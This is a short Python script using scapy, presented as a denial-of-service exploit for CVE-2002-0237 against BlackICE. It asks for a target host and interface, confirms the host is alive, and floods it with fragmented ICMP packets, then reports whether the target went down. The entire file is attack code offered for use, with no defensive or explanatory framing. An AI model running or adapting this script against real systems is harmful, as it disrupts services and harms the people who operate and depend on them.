########################################################################################
# title         : BlackICE DOS
# CVE           : CVE-2002-0237
# description   : DOS exploit based on CVE-2002-0237
# author        : Leo Depriester <leo.depriester@exadot.fr>
# date          : 2016/08/23
# version       : 1.0
########################################################################################
from scapy.all import *
class Exploit:
    
    @staticmethod
    def run():
        # Define host
        host = raw_input("Host [127.0.0.1] : ")
        if not host:
            host = "127.0.0.1"
        # Define interface
        iface = raw_input("Interface [eth0] : ")
        if not iface:
            iface = "eth0"
        Exploit.exploit(host, iface)   
    
    @staticmethod
    def exploit(host, iface):
        if Exploit.is_alive(host) == False:
            print "[-] The target seems to be down."
            exit(1)
        print "[*] Running DOS attack ..."
        fl = 600
        dl = 60000
        mtu = 1500
        maxdata = mtu - 20 - 8
        maxdata = maxdata / 8
        if maxdata < 16:
            maxdata = 544

        _id = 666
        seq = 0
        i = 0
        j = 0
        for i in range(0, fl):
            _id = _id + 1
            seq = seq + 1
            while j < dl:
                datalen = dl - j
                o = j / 8
                if datalen > maxdata:
                    o = o | 0x2000
                    datalen = maxdata
                packet = IP(ihl=5, tos=0, frag=o, proto="icmp", id=_id, ttl=0x40, dst=host)/ICMP(code=0, seq=seq, id=seq)/Raw(load=datalen-8)
                send(packet, iface=iface, verbose=False)
                j = j + maxdata
        if Exploit.is_alive(host):
            print "[-] The target is still alive."
        else:
            print "[+] The target is down, well done."
    @staticmethod
    def is_alive(host):
        reply = sr1(IP(dst=host)/ICMP(), verbose=False, timeout=2)
        if reply is not None:
            return True
        else:
            return False
